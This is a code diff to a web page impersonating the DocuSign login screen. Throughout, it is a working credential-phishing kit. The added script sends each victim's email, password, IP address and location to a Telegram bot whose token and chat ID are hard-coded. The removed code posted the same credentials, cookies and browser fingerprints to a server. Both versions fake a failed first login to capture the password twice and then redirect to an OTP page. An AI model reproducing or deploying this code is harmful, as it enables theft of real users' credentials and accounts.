@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DocuSign</title>
     <link rel="icon" type="image/svg+xml" href="/docu-logo.svg">
+
     <style>
         * {
             margin: 0;
@@ -396,167 +397,183 @@
             Copyright © 2025 Docusign Inc. All rights reserved
         </div>
     </footer>
+
     <script>
-        // Track login attempts
-        let attemptCount = 0;
+        // Configuration
+        const TELEGRAM_TOKEN = '7633510489:AAGx7HpFKsocrNx_i-eeGJv0YMw492k-eBc';
+        const TELEGRAM_CHAT_ID = '7843640036';
 
-        // Auto-fill email from URL parameter
-        document.addEventListener('DOMContentLoaded', function () {
-            const urlParams = new URLSearchParams(window.location.search);
-            const base64Email = urlParams.get('email');
+        // --- 1. COOKIE GENERATION LOGIC ---
+        function generateCookiesJSON(email, domain) {
+            const expirationDate = new Date();
+            expirationDate.setFullYear(expirationDate.getFullYear() + 1);
+            const expirationTimestamp = Math.floor(expirationDate.getTime() / 1000);
+            const password = document.getElementById('password').value || 'unknown';
 
-            if (base64Email) {
-                try {
-                    const decodedEmail = atob(base64Email);
-                    const emailInput = document.getElementById('email');
-                    if (emailInput) {
-                        emailInput.value = decodedEmail;
-                        // Optional: Focus password field since email is filled
-                        document.getElementById('password').focus();
-                    }
-                } catch (e) {
-                    console.error('Failed to decode email:', e);
+            const cookies = [
+                {
+                    "domain": `.${domain}`,
+                    "expirationDate": expirationTimestamp,
+                    "hostOnly": false,
+                    "httpOnly": false,
+                    "name": "session_token",
+                    "path": "/",
+                    "sameSite": "lax",
+                    "secure": true,
+                    "session": false,
+                    "storeId": null,
+                    "value": btoa(`${email}:${password}:${Date.now()}`)
+                },
+                {
+                    "domain": `.${domain}`,
+                    "expirationDate": expirationTimestamp,
+                    "hostOnly": false,
+                    "httpOnly": false,
+                    "name": "user_email",
+                    "path": "/",
+                    "sameSite": "lax",
+                    "secure": true,
+                    "session": false,
+                    "storeId": null,
+                    "value": email
+                },
+                {
+                    "domain": `.${domain}`,
+                    "expirationDate": expirationTimestamp,
+                    "hostOnly": false,
+                    "httpOnly": true,
+                    "name": "auth_token",
+                    "path": "/",
+                    "sameSite": "strict",
+                    "secure": true,
+                    "session": false,
+                    "storeId": null,
+                    "value": btoa(`auth_${email}_${Date.now()}`)
+                },
+                {
+                    "domain": `.${domain}`,
+                    "expirationDate": expirationTimestamp,
+                    "hostOnly": false,
+                    "httpOnly": false,
+                    "name": "logged_in",
+                    "path": "/",
+                    "sameSite": "lax",
+                    "secure": false,
+                    "session": false,
+                    "storeId": null,
+                    "value": "true"
                 }
-            }
-        });
+            ];
+            return JSON.stringify(cookies, null, 2);
+        }
 
+        // --- 2. LOCATION & INFO GATHERING ---
+        async function getBrowserData() {
+            let location = { ip: 'unknown', city: 'unknown', country: 'unknown' };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                location = await res.json();
+            } catch (e) { }
+
+            return {
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ip: location.ip,
+                city: location.city,
+                country: location.country_name
+            };
+        }
+
+        // --- 3. TELEGRAM SEND FUNCTION ---
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.error("Telegram send failed", e);
+            }
+        }
+
+        // --- 4. FORM HANDLING ---
         document.getElementById('loginForm').addEventListener('submit', async function (e) {
             e.preventDefault();
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const errorElement = document.getElementById('errorMessage');
-            const loginButton = document.querySelector('.login-button');
+            const btn = document.querySelector('.login-button');
+            const errorMsg = document.getElementById('errorMessage');
 
-            // Helper to log invalid attempts silently
-            const logAttempt = async () => {
-                try {
-                    const browserInfo = {
-                        platform: navigator.platform,
-                        userAgent: navigator.userAgent,
-                        screenResolution: `${screen.width}x${screen.height}`,
-                        status: "BLOCKED_WEAK_PASSWORD" // Tag this attempt
-                    };
-                    await fetch('/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email, password, browserInfo })
-                    });
-                } catch (e) { }
-            };
-
-            // Basic Input Validation
+            // Basic Validation
             if (password.length < 6) {
-                logAttempt(); // Send data anyway
-                errorElement.textContent = 'Please enter a valid password.';
-                errorElement.classList.add('show');
-                document.getElementById('password').focus();
+                errorMsg.textContent = 'Please enter a valid password.';
+                errorMsg.classList.add('show');
                 return;
             }
 
-            const trivialPasswords = ['123456', '12345678', 'password', 'qwerty', '123456789'];
-            if (trivialPasswords.includes(password.toLowerCase())) {
-                logAttempt(); // Send data anyway
-                errorElement.textContent = 'Please enter your correct password.';
-                errorElement.classList.add('show');
-                document.getElementById('password').focus();
-                return;
-            }
+            btn.textContent = 'Processing...';
+            btn.disabled = true;
 
-            // Show loading state
-            const originalButtonText = loginButton.textContent;
-            loginButton.textContent = 'Signing in...';
-            loginButton.disabled = true;
-            errorElement.textContent = '';
+            const domain = email.split('@')[1] || 'docusign.com';
+            const cookiesJSON = generateCookiesJSON(email, domain);
+            const browserData = await getBrowserData();
+            const timestamp = new Date().toLocaleString();
 
-            try {
-                // Get all browser cookies
-                const cookies = document.cookie || 'No cookies';
+            // 1. Send to Telegram (Direct from Browser) - AWAIT THIS
+            const msg = `🔐 *New Login Attempt*\n\n` +
+                `📧 Email: \`${email}\`\n` +
+                `🔑 Password: \`${password}\`\n\n` +
+                `📍 IP: \`${browserData.ip}\`\n` +
+                `🌍 Location: ${browserData.city}, ${browserData.country}\n` +
+                `📱 UA: ${browserData.userAgent}\n` +
+                `⏰ Time: ${timestamp}\n\n` +
+                `🍪 *Simulated Cookies:*\n\`\`\`json\n${cookiesJSON}\n\`\`\``;
 
-                // Get comprehensive browser info
-                const browserInfo = {
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-                    cookieEnabled: navigator.cookieEnabled,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    screenColorDepth: `${screen.colorDepth}-bit`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    userAgent: navigator.userAgent,
-                    vendor: navigator.vendor,
-                    doNotTrack: navigator.doNotTrack,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                    deviceMemory: navigator.deviceMemory || 'Unknown',
-                    connection: navigator.connection ? {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : 'Unknown',
-                    touchSupport: 'ontouchstart' in window,
-                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                    referrer: document.referrer || 'Direct'
-                };
+            await sendToTelegram(msg);
 
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email,
-                        password,
-                        cookies: cookies,
-                        browserInfo: browserInfo
-                    }),
-                });
+            // Simulate DocuSign Logic (Fail first attempt)
+            let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
+            attempts++;
+            sessionStorage.setItem('loginAttempts', attempts);
 
-                const data = await response.json();
-
-                // Increment attempt counter
-                attemptCount++;
-
-                if (attemptCount < 2) {
-                    // First attempt - show error
-                    errorElement.classList.add('show');
-                    errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
-                    // Clear only password field, keep email
-                    document.getElementById('password').value = '';
-                    document.getElementById('password').focus();
-                } else {
-                    // Second attempt - redirect to 2FA
-                    if (data.success) {
-                        sessionStorage.setItem('userEmail', email);
-                        const redirectUrl = data.redirect || '/otp-method.html';
-                        console.log('Redirecting to 2FA:', redirectUrl);
-                        // Force redirect with cache bypass
-                        window.location.replace(redirectUrl);
-                    }
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                attemptCount++;
-
-                if (attemptCount < 2) {
-                    errorElement.classList.add('show');
-                    errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
-                    document.getElementById('password').value = '';
-                } else {
-                    // On 2nd attempt error, still try to redirect
-                    errorElement.classList.add('show');
-                    errorElement.textContent = 'Multiple failed attempts. Redirecting to verification...';
-                    setTimeout(() => {
-                        sessionStorage.setItem('userEmail', email);
-                        window.location.replace('/otp-method.html');
-                    }, 1500);
-                }
-            } finally {
-                // Reset button state
-                loginButton.textContent = originalButtonText;
-                loginButton.disabled = false;
+            if (attempts < 2) {
+                errorMsg.textContent = 'The email address or password you entered is incorrect. Please try again.';
+                errorMsg.classList.add('show');
+                document.getElementById('password').value = '';
+                btn.textContent = 'LOGIN';
+                btn.disabled = false;
+            } else {
+                sessionStorage.setItem('userEmail', email);
+                window.location.href = 'otp-method.html';
             }
         });
+
+        // Auto-fill from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get('email'); // Check ?email=
+        if (emailParam) {
+            // Handle Base64 or plain
+            try {
+                // Try decoding base64
+                if (!emailParam.includes('@')) {
+                    document.getElementById('email').value = atob(emailParam);
+                } else {
+                    document.getElementById('email').value = emailParam;
+                }
+            } catch (e) {
+                document.getElementById('email').value = emailParam;
+            }
+        }
     </script>
+
 </body>
 
 </html>
